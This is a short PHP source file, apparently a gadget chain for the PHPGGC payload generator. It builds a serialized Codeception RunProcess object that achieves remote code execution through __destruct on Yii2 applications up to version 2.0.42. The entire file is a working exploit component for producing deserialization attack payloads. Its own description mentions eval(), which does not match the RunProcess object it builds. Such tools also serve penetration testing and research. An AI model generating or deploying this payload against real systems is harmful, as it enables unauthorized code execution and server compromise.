<?php

namespace GadgetChain\Yii2;


class RCE4 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '<=2.0.42';
    public static $vector = '__destruct';
    public static $author = 'xxx';
    public static $information = 'Executes given PHP code through eval().';
    public static $parameters = [ 
        'code'
    ];

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        $pro = new \Codeception\Extension\RunProcess($code);

        return $pro;
    }
}
